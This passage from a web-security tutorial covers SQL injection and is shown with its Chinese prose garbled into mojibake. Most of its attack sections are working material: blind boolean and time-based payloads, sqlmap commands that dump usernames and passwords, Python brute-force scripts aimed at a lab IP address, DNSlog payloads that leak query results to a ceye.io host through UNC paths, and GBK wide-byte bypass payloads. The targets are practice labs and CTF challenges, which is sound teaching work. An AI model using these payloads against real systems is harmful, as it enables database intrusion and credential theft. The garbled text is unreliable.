--+\nã€ç¬¬ä¸€ä¸ªè¡¨åä¸ºemailsã€‘\n```\n\n###### æ–¹æ³•2ï¼šä½¿ç”¨`Burpsuiteçš„Intruderæ¨¡å—`\n\nä½¿ç”¨æ–¹æ³•è·Ÿä¸Šæ–¹è·å¾—æ•°æ®åº“åä¸€æ ·ï¼Œå°±ä¸èµ˜è¿°äº†\n\n![](https://i.loli.net/2020/05/15/4O3Hv2Iekq7tSzw.png)\n\n![](https://i.loli.net/2020/05/15/bdvhEPFcnsYTwQJ.png)\n\n##### 7.çŒœè§£å­—æ®µåå’Œå­—æ®µä¿¡æ¯\n\n```sql\n#ç¡®å®šå­—æ®µä¸ªæ•°\n?id=1' and (select count(column_name) from information_schema.columns where table_schema=database() and table_name = 'users')>0 --+\n?id=1' and (select count(column_name) from information_schema.columns where table_schema=database() and table_name = 'users')=3 --+\nã€å­—æ®µä¸ªæ•°ä¸º3ã€‘\n\n#ç¡®å®šå­—æ®µåçš„é•¿åº¦\n?id=1' and length((select  column_name from information_schema.columns where table_schema=database() and table_name = 'users' limit 0,1))>0 --+\n?id=1' and length((select  column_name from information_schema.columns where table_schema=database() and table_name = 'users' limit 0,1))=2 --+\n?id=1' and length((select  column_name from information_schema.columns where table_schema=database() and table_name = 'users' limit 1,1))=8 --+\nã€ç¬¬ä¸€ä¸ªå­—æ®µé•¿åº¦ä¸º2ï¼Œç¬¬äºŒä¸ªå­—æ®µé•¿åº¦ä¸º8ã€‘\n\n#çŒœå­—æ®µå åŒä¸Šä½¿ç”¨burp\n?id=1' and substr((select column_name from information_schema.columns where table_schema=database() and table_name = 'users' limit 0,1),1,1)='i'  --+\nã€...id,username,password...ã€‘\n\n#ç¡®å®šå­—æ®µæ•°æ®é•¿åº¦\n?id=1' and length((select username from users limit 0,1))=4  --+\nã€ç¬¬ä¸€ä¸ªå­—æ®µæ•°æ®é•¿åº¦ä¸º4ã€‘\n\n#çŒœè§£å­—æ®µæ•°æ® åŒä¸Šä½¿ç”¨burp\n?id=1' and substr((select username from users limit 0,1),1,1)='d'  --+\n\n?id=1' and ascii(substr((select username from users limit 0,1),1,1))>79  --+\nã€ç¬¬ä¸€ä¸ªusernameæ•°æ®ä¸ºdumbã€‘\n```\n\n#### SqlMapå®ç°å¸ƒå°”ç›²æ³¨\n\n```\n--batch: ç”¨æ­¤å‚æ•°ï¼Œä¸éœ€è¦ç”¨æˆ·è¾“å…¥ï¼Œå°†ä¼šä½¿ç”¨sqlmapæç¤ºçš„é»˜è®¤å€¼ä¸€ç›´è¿è¡Œä¸‹å»ã€‚\n--technique:é€‰æ‹©æ³¨å…¥æŠ€æœ¯ï¼ŒB:Boolean-based-blind  ï¼ˆå¸ƒå°”å‹ç›²æ³¨ï¼‰\n--threads 10 :è®¾ç½®çº¿ç¨‹ä¸º10ï¼Œè¿è¡Œé€Ÿåº¦ä¼šæ›´å¿«\n```\n\n```bash\n#æŸ¥è¯¢æ•°æ®åº“ #ã€securityã€‘\npython sqlmap.py -u http://139.224.112.182:8087/sqli1/Less-5/?id=1 --technique B --dbs --batch --threads 10\n\n#è·å–æ•°æ®åº“ä¸­çš„è¡¨ #ã€emailsã€referersã€uagentsã€usersã€‘\npython sqlmap.py  -u http://139.224.112.182:8087/sqli1/Less-5/?id=1 --technique B -D security  --tables --batch --threads 10\n\n#è·å–è¡¨ä¸­çš„å­—æ®µå #ã€idã€usernameã€passwordã€‘\npython sqlmap.py -u http://139.224.112.182:8087/sqli1/Less-5/?id=1 --technique B -D security -T users --columns --batch --threads 10\n\n#è·å–å­—æ®µä¿¡æ¯ #ã€Dumb|Dumbã€dhakkan|dumbo ...ã€‘\npython sqlmap.py -u http://139.224.112.182:8087/sqli1/Less-5/?id=1 --technique B -D security -T users -C username,password --dump --batch --threads 10\n```\n\n####  è„šæœ¬å®ç°å¸ƒå°”ç›²æ³¨\n\n##### 1.è·å–æ•°æ®åº“åé•¿åº¦\n\n  ```python\n# coding:utf-8\nimport requests\n\n# è·å–æ•°æ®åº“åé•¿åº¦\ndef database_len():\n    for i in range(1, 10):\n        url = '''http://139.224.112.182:8087/sqli1/Less-5/'''\n        payload = '''?id=1' and length(database())=%d''' %i\n        r = requests.get(url + payload + '%23') # %23 <==> --+\n        if 'You are in' in r.text:\n            print('database_length:', i)\n            break\n        else:\n            print(i)\n\ndatabase_len()\n# ã€database_length: 8ã€‘\n  ```\n\n##### 2.è·å–æ•°æ®åº“å\n\n```python\n# coding:utf-8\nimport requests\n#è·å–æ•°æ®åº“å\ndef database_name():\n    name = ''\n    for j in range(1,9):\n        for i in '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_':\n            url = \"http://139.224.112.182:8087/sqli1/Less-5/\"    \n            payload = \"?id=1' and substr(database(),%d,1)='%s' --+\"  %(j, i) \n            r = requests.get(url + payload)\n            if 'You are in' in r.text:\n                name = name + i\n                print(name)\n                break\n    print('database_name:', name)\n\ndatabase_name()\n# ã€database_name: securityã€‘\n```\n\n##### 3.è·å–æ•°æ®åº“ä¸­è¡¨\n\n```python\n# coding:utf-8\nimport requests\n# è·å–æ•°æ®åº“è¡¨\ndef tables_name():\n    name = ''\n    for j in range(1, 30):\n        for i in 'abcdefghijklmnopqrstuvwxyz,':\n            url = \"http://139.224.112.182:8087/sqli1/Less-5/\"    \n            payload = '''?id=1' and substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1)='%s' --+''' % (j, i)\n            r = requests.get(url + payload)\n            if 'You are in' in r.text:\n                name = name + i\n                print(name)\n                break\n    print('table_name:', name)\n\ntables_name()\n\n#ã€table_name: emails,referers,uagents,usersã€‘\n```\n\n##### 4.è·å–è¡¨ä¸­å­—æ®µ\n\n```python\n# coding:utf-8\nimport requests\n\n# è·å–è¡¨ä¸­å­—æ®µ\ndef columns_name():\n    name = ''\n    for j in range(1, 30):\n        for i in 'abcdefghijklmnopqrstuvwxyz,':\n            url = \"http://139.224.112.182:8087/sqli1/Less-5/\"    \n            payload = \"?id=1' and substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),%d,1)='%s' --+\" %(j, i)        \n            r = requests.get(url + payload)\n            if 'You are in' in r.text:\n                name = name + i\n                print(name)\n                break\n    print('column_name:', name)\n\ncolumns_name()\n#ã€column_name: id,username,passwordã€‘\n```\n\n##### 5.è·å–å­—æ®µå€¼\n\n```python\n# coding:utf-8\nimport requests\n# è·å–å­—æ®µå€¼\ndef value():\n    name = ''\n    for j in range(1, 100):\n        for i in '0123456789abcdefghijklmnopqrstuvwxyz,_-':\n            url = \"http://139.224.112.182:8087/sqli1/Less-5/\"  \n            payload = \"?id=1' and substr((select group_concat(username,password) from users),%d,1)='%s' --+\" %(j, i)    \n            r = requests.get(url + payload)\n            if 'You are in' in r.text:\n                name = name + i\n                print(name)\n                break\n    print('value:', name)\n\nvalue()\n```\n\n### æ—¶é—´ç›²æ³¨\n\n#### æ—¶é—´æ³¨å…¥åˆ©ç”¨æƒ…æ™¯\n\n- é¡µé¢ä¸Šæ²¡æœ‰æ˜¾ç¤ºä½\n- æ²¡æœ‰è¾“å‡ºæŠ¥é”™è¯­å¥\n- æ­£ç¡®çš„sqlè¯­å¥å’Œé”™è¯¯çš„sqlè¯­å¥é¡µé¢è¿”å›ä¸€è‡´\n\n#### æ‰‹å·¥å®ç°æ—¶é—´ç›²æ³¨\n\né¶æœºï¼šsqli-labsç¬¬9å…³\n\n```sql\n?id=1 \n?id=1'\n?id=1\"\n#ä¸ç®¡æ€ä¹ˆæ ·éƒ½ä¸æŠ¥é”™ï¼Œä¸ç®¡å¯¹é”™ä¸€ç›´æ˜¾ç¤ºä¸€ä¸ªå›ºå®šçš„é¡µé¢ï¼›\n\n#åˆ¤æ–­æ³¨å…¥ç‚¹\n?id=1' and sleep(3)--+\n#é¡µé¢å“åº”å»¶è¿Ÿï¼Œåˆ¤æ–­å­˜åœ¨æ—¶é—´å»¶è¿Ÿå‹æ³¨å…¥\n\n#è·å–æ•°æ®åº“åé•¿åº¦\n?id=1' and if(length(database())=8,sleep(3),1)--+\n\n#è·å–æ•°æ®åº“å\n?id=1' and if(substr(database(),1,1)='s',sleep(3),1)--+\n```\n\n**ç»“åˆ`Burpsuiteçš„Intruderæ¨¡å—`çˆ†ç ´æ•°æ®åº“å**\n\nå°†è·å–æ•°æ®åº“ç¬¬ä¸€ä¸ªå­—ç¬¦çš„è¯·æ±‚åŒ…æ‹¦æˆªå¹¶å‘é€åˆ°Intruderæ¨¡å—\n\nè®¾ç½®æ”»å‡»å˜é‡ä»¥åŠæ”»å‡»ç±»å‹\n\n![](https://i.loli.net/2020/05/15/cYjrQ6ygw3TxJGS.png)è®¾ç½®ç¬¬ä¸€ä¸ªæ”»å‡»å˜é‡ï¼Œè¿™ä¸ªå˜é‡æ˜¯æ§åˆ¶ç¬¬å‡ ä¸ªå­—ç¬¦çš„\n\n![](https://i.loli.net/2020/05/15/Q9VEkKqtIJOcPdh.png)\n\nè®¾ç½®ç¬¬äºŒä¸ªæ”»å‡»å˜é‡ï¼Œè¿™ä¸ªå˜é‡æ˜¯æ•°æ®åº“åå­—ç¬¦\n\n![](https://i.loli.net/2020/05/15/Ruzc9a1JPyVfKq3.png)\n\nå¼€å§‹æ”»å‡»ï¼Œä¸€å°ä¼šå°±èƒ½å¾—åˆ°æµ‹è¯•ç»“æœï¼Œé€šè¿‡å¯¹é•¿åº¦å’Œå˜é‡è¿›è¡Œæ’åºå¯ä»¥çœ‹åˆ°æ•°æ®åº“åæˆåŠŸå¾—åˆ°\n\n![image-20200515211534056](https://i.loli.net/2020/05/15/izwlJ71SsEYByIO.png)\n\n\n\n**è·å–è¡¨åã€å­—æ®µåã€å­—æ®µä¿¡æ¯ç­‰æ•°æ®æ–¹æ³•åŒä¸Šï¼Œå°±ä¸èµ˜è¿°äº†**\n\n#### SQLmapå®ç°æ—¶é—´ç›²æ³¨\n\n```\n--batch: ç”¨æ­¤å‚æ•°ï¼Œä¸éœ€è¦ç”¨æˆ·è¾“å…¥ï¼Œå°†ä¼šä½¿ç”¨sqlmapæç¤ºçš„é»˜è®¤å€¼ä¸€ç›´è¿è¡Œä¸‹å»ã€‚\n--technique:é€‰æ‹©æ³¨å…¥æŠ€æœ¯ï¼Œ-T:Time-based blind  ï¼ˆåŸºäºæ—¶é—´å»¶è¿Ÿæ³¨å…¥ï¼‰\n--threads 10 :è®¾ç½®çº¿ç¨‹ä¸º10ï¼Œè¿è¡Œé€Ÿåº¦ä¼šæ›´å¿«ã€‚\n```\n\n```bash\n#æŸ¥è¯¢æ•°æ®åº“ #ã€securityã€‘\npython sqlmap.py -u http://139.224.112.182:8087/sqli1/Less-9/?id=1 --technique T --dbs --batch --threads 10\n\n#è·å–æ•°æ®åº“ä¸­çš„è¡¨ #ã€emailsã€referersã€uagentsã€usersã€‘\npython sqlmap.py  -u http://139.224.112.182:8087/sqli1/Less-9/?id=1 --technique T -D security  --tables --batch --threads 10\n\n#è·å–è¡¨ä¸­çš„å­—æ®µå #ã€idã€usernameã€passwordã€‘\npython sqlmap.py -u http://139.224.112.182:8087/sqli1/Less-9/?id=1 --technique T -D security -T users --columns --batch --threads 10 \n\n#è·å–å­—æ®µä¿¡æ¯ ã€Dumb|Dumbã€dhakkan|dumbo ...ã€‘\npython sqlmap.py -u http://139.224.112.182:8087/sqli1/Less-9/?id=1 --technique T -D security -T users -C username,password --dump --batch --threads 10 \n\n```\n\n#### è„šæœ¬å®ç°æ—¶é—´ç›²æ³¨\n\n##### 1.è·å–æ•°æ®åº“åé•¿åº¦\n\n```python\n# coding:utf-8\nimport requests\nimport datetime\n\n# è·å–æ•°æ®åº“åé•¿åº¦\ndef database_len():\n    for i in range(1, 10):\n        url = '''http://139.224.112.182:8087/sqli1/Less-9/'''\n        payload = '''?id=1' and if(length(database())=%d,sleep(3),1)--+''' %i\n        time1 = datetime.datetime.now()\n        r = requests.get(url + payload)\n        time2 = datetime.datetime.now()\n        sec = (time2 - time1).seconds\n        if sec >= 3:\n            print('database_len:', i)\n            break\n        else:\n            print(i)\n            \ndatabase_len()\n```\n\n##### 2.è·å–æ•°æ®åº“å\n\n```python\n# coding:utf-8\nimport requests\nimport datetime\n\n#è·å–æ•°æ®åº“å\ndef database_name():\n    name = ''\n    for j in range(1, 9):\n        for i in '0123456789abcdefghijklmnopqrstuvwxyz_':\n            url = '''http://139.224.112.182:8087/sqli1/Less-9/'''\n            payload = '''?id=1' and if(substr(database(),%d,1)='%s',sleep(1),1) --+''' % (j,i)\n            time1 = datetime.datetime.now()\n            r = requests.get(url + payload)\n            time2 = datetime.datetime.now()\n            sec = (time2 - time1).seconds\n            if sec >= 1:\n                name = name + i\n                print(name)\n                break\n    print('database_name:', name)\n\ndatabase_name()\n```\n\n**è·å–è¡¨åã€å­—æ®µåã€å­—æ®µä¿¡æ¯ç­‰æ•°æ®çš„è„šæœ¬ç±»ä¼¼ä¸Šé¢å¸ƒå°”ç›²æ³¨è„šæœ¬ï¼Œå°±ä¸èµ˜è¿°äº†**\n## ä¸‰ã€DNSlogç›²æ³¨\n\n### åŸºç¡€çŸ¥è¯†\n\n#### ä»€ä¹ˆæ˜¯DNS\n\nDNSçš„å…¨ç§°æ˜¯ `Domain Name System`ï¼ˆåŸŸåç³»ç»Ÿï¼‰ï¼Œå®ƒå°†åŸŸåè§£æä¸º IPï¼Œä½¿äººæ›´æ–¹ä¾¿åœ°è®¿é—®äº’è”ç½‘ã€‚å½“ç”¨æˆ·è¾“å…¥æŸä¸€ç½‘å€å¦‚`www.baidu.com`ï¼Œç½‘ç»œä¸Šçš„ DNS æœåŠ¡å™¨ä¼šå°†è¯¥åŸŸåè§£æï¼Œå¹¶æ‰¾åˆ°å¯¹åº”çš„çœŸå®IPï¼š`182.61.200.6`ï¼Œä½¿ç”¨æˆ·å¯ä»¥è®¿é—®è¿™å°æœåŠ¡å™¨ä¸Šç›¸åº”çš„æœåŠ¡ã€‚\n\n#### ä»€ä¹ˆæ˜¯DNSlog\n\nDNSlog å°±æ˜¯å­˜å‚¨åœ¨ DNS æœåŠ¡å™¨ä¸Šçš„åŸŸåä¿¡æ¯ï¼Œå®ƒè®°å½•ç€ç”¨æˆ·å¯¹åŸŸåçš„è®¿é—®ä¿¡æ¯ï¼Œç±»ä¼¼æ—¥å¿—æ–‡ä»¶ã€‚SQL ç›²æ³¨ã€å‘½ä»¤æ‰§è¡Œã€SSRF åŠ XSS ç­‰æ”»å‡»è€Œæ— æ³•çœ‹åˆ°å›æ˜¾ç»“æœæ—¶ï¼Œå°±ä¼šç”¨åˆ° DNSlog æŠ€æœ¯ã€‚\n\n#### ä¸ºä»€ä¹ˆç”¨Dnslogç›²æ³¨\n\nå¯¹äºSQLç›²æ³¨ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å¸ƒå°”æˆ–è€…æ—¶é—´ç›²æ³¨è·å–å†…å®¹ï¼Œä½†æ˜¯æ•´ä¸ªè¿‡ç¨‹æ•ˆç‡ä½ï¼Œéœ€è¦å‘é€å¾ˆå¤šçš„è¯·æ±‚è¿›è¡Œåˆ¤æ–­ï¼Œå®¹æ˜“è§¦å‘å®‰å…¨è®¾å¤‡çš„é˜²æŠ¤ï¼Œæœ€åå¯¼è‡´ IP è¢« banï¼ŒDnslog ç›²æ³¨å¯ä»¥å‡å°‘å‘é€çš„è¯·æ±‚ï¼Œç›´æ¥å›æ˜¾æ•°æ®å®ç°æ³¨å…¥ã€‚\n\n### åŸç†\n\n**Mysqlæ”»å‡»è¯­å¥:**\n\n```sql\nselect load_file(concat('\\\\\\\\',æ”»å‡»è¯­å¥,'.XXX.ceye.io\\\\abc'))\n```\n\n**åˆ©ç”¨DNSlogçš„å‰ææ¡ä»¶ï¼š**\n\n- 1.æ”¯æŒ`load_file()`å‡½æ•°ï¼Œé€šè¿‡æ‰§è¡Œ `show variables like '%secure%';` æŸ¥çœ‹  `load_file()` æ˜¯å¦å¯ä»¥è¯»å–æ–‡ä»¶ã€‚\t\n\n  - å½“secure_file_privä¸ºç©ºï¼Œå°±å¯ä»¥è¯»å–ç£ç›˜çš„ç›®å½•ã€‚\n  - å½“secure_file_privä¸ºG:\\ï¼Œå°±å¯ä»¥è¯»å–Gç›˜çš„æ–‡ä»¶ã€‚\n  - å½“secure_file_privä¸ºnullï¼Œload_fileå°±ä¸èƒ½åŠ è½½æ–‡ä»¶ã€‚\n  - é€šè¿‡è®¾ç½®my.iniæ¥é…ç½®ã€‚secure_file_priv=\"\"å°±æ˜¯å¯ä»¥load_flieä»»æ„ç£ç›˜çš„æ–‡ä»¶ã€‚\n- 2.DNSlogå¹³å°\n\n  - http://ceye.io\n  - http://www.dnslog.cn\n  - http://admin.dnslog.link\n\n  - https://github.com/bugscanteam/dnslog/\n- Windowå¹³å°ï¼ŒLinuxå¹³å°ä¸æ”¯æŒã€‚è¿™ä¸ªæŠ€æœ¯æœ¬è´¨æ˜¯åˆ©ç”¨ UNC å‘èµ·çš„ DNS æŸ¥è¯¢ï¼Œå› ä¸º Linux æ²¡æœ‰ UNC è·¯å¾„ï¼Œæ‰€ä»¥å½“å¤„äº Linux ç³»ç»Ÿæ—¶ï¼Œä¸èƒ½ä½¿ç”¨è¯¥æ–¹å¼è·å–æ•°æ®ï¼Œè€Œä¸” UNC çš„è·¯å¾„ä¸èƒ½è¶…è¿‡ 128ï¼Œå¦åˆ™ä¼šå¤±è´¥ã€‚å½“æˆ‘ä»¬åœ¨ä½¿ç”¨ UNC è·¯å¾„æ—¶ï¼Œæ˜¯ä¼šå¯¹åŸŸåè¿›è¡Œ DNS æŸ¥è¯¢ã€‚\n\n**UNCè·¯å¾„:**\n\n> UNCæ˜¯ä¸€ç§å‘½åæƒ¯ä¾‹, ä¸»è¦ç”¨äºåœ¨Microsoft Windowsä¸ŠæŒ‡å®šå’Œæ˜ å°„ç½‘ç»œé©±åŠ¨å™¨. UNCå‘½åæƒ¯ä¾‹æœ€å¤šè¢«åº”ç”¨äºåœ¨å±€åŸŸç½‘ä¸­è®¿é—®æ–‡ä»¶æœåŠ¡å™¨æˆ–è€…æ‰“å°æœºã€‚æˆ‘ä»¬æ—¥å¸¸å¸¸ç”¨çš„ç½‘ç»œå…±äº«æ–‡ä»¶å°±æ˜¯è¿™ä¸ªæ–¹å¼ã€‚\n\nå…¶å®æˆ‘ä»¬å¹³å¸¸åœ¨Widnowsä¸­ç”¨å…±äº«æ–‡ä»¶çš„æ—¶å€™å°±ä¼šç”¨åˆ°è¿™ç§ç½‘ç»œåœ°å€çš„å½¢å¼\n\n```\n\\\\192.168.1.132\\test\\\n```\n\nè¿™ä¹Ÿå°±è§£é‡Šäº†ä¸ºä»€ä¹ˆ`CONCAT()`å‡½æ•°æ‹¼æ¥äº†4ä¸ª`\\`äº†ï¼Œå› ä¸ºè½¬ä¹‰çš„åŸå› ï¼Œ4ä¸ª`\\`å°±å˜æˆäº†2ä¸ª`\\`ï¼Œåé¢çš„`\\\\abc`å˜æˆäº†`\\abc`ï¼Œç›®çš„å°±æ˜¯åˆ©ç”¨UNCè·¯å¾„ã€‚\n\nå› ä¸º Linux æ²¡æœ‰ UNC è·¯å¾„è¿™ä¸ªä¸œè¥¿ï¼Œæ‰€ä»¥å½“ MySQL å¤„äº Linux ç³»ç»Ÿä¸­çš„æ—¶å€™ï¼Œæ˜¯ä¸èƒ½ä½¿ç”¨è¿™ç§æ–¹å¼å¤–å¸¦æ•°æ®çš„ã€‚\n\n| åŸç†å›¾                                               | åŸç†å›¾                                               |\n| ---------------------------------------------------- | ---------------------------------------------------- |\n| ![](https://img.jwt1399.top//img/20200806155150.jpg) | ![](https://img.jwt1399.top//img/20200806155100.png) |\n\nå¦‚å›¾æ‰€ç¤ºï¼Œä½œä¸ºæ”»å‡»è€…ï¼Œæäº¤æ³¨å…¥è¯­å¥ï¼Œè®©æ•°æ®åº“æŠŠéœ€è¦æŸ¥è¯¢çš„å€¼å’ŒåŸŸåæ‹¼æ¥èµ·æ¥ï¼Œç„¶åå‘ç”ŸDNSæŸ¥è¯¢ï¼Œæˆ‘ä»¬åªè¦èƒ½è·å¾—DNSçš„æ—¥å¿—ï¼Œå°±å¾—åˆ°äº†æƒ³è¦çš„å€¼ã€‚æ‰€ä»¥æˆ‘ä»¬éœ€è¦æœ‰ä¸€ä¸ªè‡ªå·±çš„åŸŸåï¼Œç„¶ååœ¨åŸŸåå•†å¤„é…ç½®ä¸€æ¡NSè®°å½•ï¼Œç„¶åæˆ‘ä»¬åœ¨NSæœåŠ¡å™¨ä¸Šé¢è·å–DNSæ—¥å¿—å³å¯ã€‚\n\n **è¯¦ç»†è§£é‡Šï¼š**\n\n1ã€æ”»å‡»è€…æäº¤æ³¨å…¥è¯­å¥`select load_file(concat('\\\\\\\\','æ”»å‡»è¯­å¥',.XXX.ceye.io\\\\abc))`\n\n2ã€WebæœåŠ¡å™¨å°†è¯­å¥ä¼ é€’ç»™æ•°æ®åº“ï¼Œåœ¨æ•°æ®åº“ä¸­æ”»å‡»è¯­å¥è¢«æ‰§è¡Œ\n\n3ã€`concat`å‡½æ•°å°†æ‰§è¡Œç»“æœä¸`XXX.ceye.io\\\\abc`æ‹¼æ¥ï¼Œæ„æˆ`\\\\root.XXX.ceye.io\\abc`ï¼Œè€Œ `mysql` ä¸­çš„ `select load_file()`å¯ä»¥å‘èµ· DNS è¯·æ±‚\n\n4ã€é‚£ä¹ˆè¿™ä¸€æ¡å¸¦æœ‰æ•°æ®åº“æŸ¥è¯¢ç»“æœçš„åŸŸåå°±è¢«æäº¤åˆ°DNSæœåŠ¡å™¨è¿›è¡Œè§£æ;\n\n5ã€æ­¤æ—¶ï¼Œå¦‚æœæˆ‘ä»¬å¯ä»¥æŸ¥çœ‹DNSæœåŠ¡å™¨ä¸Šçš„Dnslogå°±å¯ä»¥å¾—åˆ°SQLæ³¨å…¥ç»“æœã€‚é‚£ä¹ˆæˆ‘ä»¬å¦‚ä½•è·å¾—è¿™æ¡DNSæŸ¥è¯¢è®°å½•å‘¢ï¼Ÿæ³¨æ„æ³¨å…¥è¯­å¥ä¸­çš„`ceye.io`ï¼Œè¿™å…¶å®æ˜¯ä¸€ä¸ªå¼€æ”¾çš„DNSlogå¹³å°ï¼Œåœ¨ä¸Šé¢æˆ‘ä»¬å¯ä»¥è·å–åˆ°æœ‰å…³`ceye.io`çš„DNSæŸ¥è¯¢ä¿¡æ¯ã€‚\n\n6ã€å½“å®ƒå‘ç°åŸŸåä¸­å­˜åœ¨`ceye.io`æ—¶ï¼Œå®ƒä¼šå°†è¿™æ¡åŸŸåä¿¡æ¯è½¬åˆ°ç›¸åº”çš„[NSæœåŠ¡å™¨](https://baike.baidu.com/item/NS/2907719?fr=aladdin)ä¸Šï¼Œè€Œé€šè¿‡[http://ceye.io](http://ceye.io/)æˆ‘ä»¬å°±å¯ä»¥æŸ¥è¯¢åˆ°è¿™æ¡DNSè§£æè®°å½•ã€‚\n\n###  å®ä¾‹\n\n#### **DVWA-SQLç›²æ³¨**\n\n##### **æŸ¥è¯¢æ•°æ®åº“**\n\n```sql\n1' and if((select load_file(concat('\\\\\\\\',(select database()),'.xxxx.ceye.io\\\\sql_test'))),1,0)#\n```\n\n![](https://img.jwt1399.top//img/20200806181940.png)\n\n##### **æŸ¥è¯¢è¡¨**\n\n```sql\n1' and if((select load_file(concat('\\\\\\\\',(select table_name from information_schema.tables where table_schema=database() limit 0,1),'.xxxx.ceye.io\\\\sql_test'))),1,0)#\n```\n\n![](https://img.jwt1399.top//img/20200806182142.png)\n\n##### **æŸ¥è¯¢åˆ—**\n\n```sql\n1' and if((select load_file(concat('\\\\\\\\',(select column_name from information_schema.columns where table_name='users' limit 4,1),'.xxxx.ceye.io\\\\sql_test'))),1,0)#\n```\n\n![](https://img.jwt1399.top//img/20200806182629.png)\n\n##### **æŸ¥è¯¢å€¼**\n\n```sql\n1' and if((select load_file(concat('\\\\\\\\',(select password from users limit 0,1),'.xxxx.ceye.io\\\\sql_test'))),1,0)#\n```\n\n![](https://img.jwt1399.top//img/20200806182944.png)\n\n**å‚è€ƒï¼š**\n\n- [æ‰‹æŠŠæ‰‹å¸¦ä½ åˆ©ç”¨SQLmapç»“åˆOOBæŠ€æœ¯å®ç°éŸ³é€Ÿç›²æ³¨](https://www.freebuf.com/sectool/222967.html)\n- [å·§ç”¨DNSlogå®ç°æ— å›æ˜¾æ³¨å…¥](https://www.cnblogs.com/afanti/p/8047530.html)\n\n## å››ã€å®½å­—èŠ‚æ³¨å…¥\n\n### åŸç†\n\n> å®½å­—èŠ‚æ³¨å…¥æ˜¯åˆ©ç”¨mysqlçš„ä¸€ä¸ªç‰¹æ€§ï¼Œ`mysqlåœ¨ä½¿ç”¨GBKç¼–ç çš„æ—¶å€™ï¼Œä¼šè®¤ä¸ºä¸¤ä¸ªå­—ç¬¦æ˜¯ä¸€ä¸ªæ±‰å­—`ã€å‰ä¸€ä¸ªasciiç è¦å¤§äº`128`ï¼Œæ‰åˆ°æ±‰å­—çš„èŒƒå›´ã€‘\n\nåœ¨PHPé…ç½®æ–‡ä»¶ä¸­`magic_quotes_gpc=On`æˆ–è€…ä½¿ç”¨`addslashes`å‡½æ•°ï¼Œ`icov`å‡½æ•°,`mysql_real_escape_string`å‡½æ•°ã€`mysql_escape_string`å‡½æ•°ç­‰ï¼Œæäº¤çš„å‚æ•°ä¸­å¦‚æœå¸¦æœ‰å•å¼•å·`'`ï¼Œå°±ä¼šè¢«è‡ªåŠ¨è½¬ä¹‰`\\'`ï¼Œè¿™æ ·å°±ä½¿å¾—å¤šæ•°æ³¨å…¥æ”»å‡»æ— æ•ˆã€‚\n\nå½“è¾“å…¥å•å¼•å·ï¼Œå‡è®¾è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨`addslashes`è½¬ä¹‰ï¼Œå¯¹åº”çš„urlç¼–ç æ˜¯ï¼š\n**`'` -->`\\'`--> `%5c%27`**\nå½“åœ¨å‰é¢å¼•å…¥ä¸€ä¸ªASCIIå¤§äº128çš„å­—ç¬¦ã€æ¯”å¦‚%dfã€%aaã€‘ï¼Œurlç¼–ç å˜ä¸ºï¼š\n**`%df'` --> `%df\\'` --> `(%df%5C)%27`-->`(æ•°æ®åº“GBK)`-->`é‹'`**\n\n| %5c%27                                               | %df%5C%27                                            |\n| ---------------------------------------------------- | ---------------------------------------------------- |\n| ![](https://img.jwt1399.top//img/20200608094626.png) | ![](https://img.jwt1399.top//img/20200608094630.png) |\n\nå‰ç«¯è¾“å…¥**`%df'`**æ—¶é¦–å…ˆç»è¿‡ä¸Šé¢**`addslashes`**å‡½æ•°å’Œæµè§ˆå™¨**`urlç¼–ç `**è½¬ä¹‰å˜æˆäº†**`%df%5c%27`**\n\nå› ä¸ºæ•°æ®åº“ä½¿ç”¨`GBK`ç¼–ç çš„è¯ï¼Œ**%df%5cä¼šè¢«å½“ä½œä¸€ä¸ªæ±‰å­—å¤„ç†,è½¬æ¢æˆäº†æ±‰å­—\"é‹\"**ï¼Œä»è€Œä½¿`%27`ï¼ˆå•å¼•å·ï¼‰é€ƒå‡ºç”Ÿå¤©ï¼ŒæˆåŠŸç»•è¿‡,åˆ©ç”¨è¿™ä¸ªç‰¹æ€§ä»è€Œå¯å®æ–½SQLæ³¨å…¥çš„åˆ©ç”¨ã€‚\n\n[åœ¨çº¿GBKæ±‰å­—ç¼–ç å­—ç¬¦é›†å¯¹ç…§è¡¨](http://www.jsons.cn/gbkcode)\n\n### å®ä¾‹\n\n**é¢˜ç›®æ¥æºï¼šCG-CTF---GBK Injection**\n\n#### æ‰‹å·¥æ³¨å…¥\n\né¢˜ç›®åœ°å€ï¼šhttp://chinalover.sinaapp.com/SQL-GBK/index.php?id=1\n\n```sql\n?id=1\n'''\nyour sql:select id,title from news where id = '1'\nhere is the information\n'''\n```\nè¾“å…¥`1'`å¯ä»¥çœ‹åˆ°`'`è¢«å˜æˆäº†`\\'`,åº”è¯¥æ˜¯`addslashes`ä¹‹ç±»çš„å‡½æ•°è½¬ä¹‰çš„ç»“æœã€‚\n```sql\n?id=1'\n'''\nyour sql:select id,title from news where id = '1\\''\nhere is the information    \n'''\n```\n\nç”¨ä¸Šæ–‡å®½å­—èŠ‚æ„é€ æ–¹æ³•ï¼Œæ„é€ id=1%df'æˆ–è€…id=1%aa'ï¼ŒæˆåŠŸæŠ¥é”™\n\n```sql\n?id=1%df'\næˆ–è€…ã€åªè¦ASCIIå¤§äº128çš„å­—ç¬¦å°±å¯ä»¥ã€‘\n?id=1%aa'\n'''\nyour sql:select id,title from news where id = '1ÃŸ\\''\nWarning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in SQL-GBK/index.php on line 10\n'''\n```\n\n**ç¡®å®šå­—æ®µæ•°**\n\n```sql\n?id=1%aa' order by 1 --+\tæ­£å¸¸\n?id=1%aa' order by 2 --+\tæ­£å¸¸\n?id=1%aa' order by 3 --+\tæŠ¥é”™\n'''\næ‰€ä»¥å­—æ®µæ•°ä¸º2\n'''\n```\n\n**ç¡®å®šæ˜¾ç¤ºä½**\n\nå‰é¢å¿…é¡»ä¸º-1ã€å‰é¢æŸ¥å‡ºæ¥çš„å€¼ä¸ºnullï¼Œæ‰èƒ½æ˜¾ç¤ºåé¢æˆ‘ä»¬æƒ³è¦çš„ä¿¡æ¯ã€‘ï¼Œåé¢çš„ä¿¡æ¯æ‰èƒ½æ˜¾ç¤ºå‡ºæ¥\n\n```sql\n?id=-1%aa' union select 1,2  --+\n'''\nyour sql:select id,title from news where id = '-1æ­¿'union select 1,2 -- 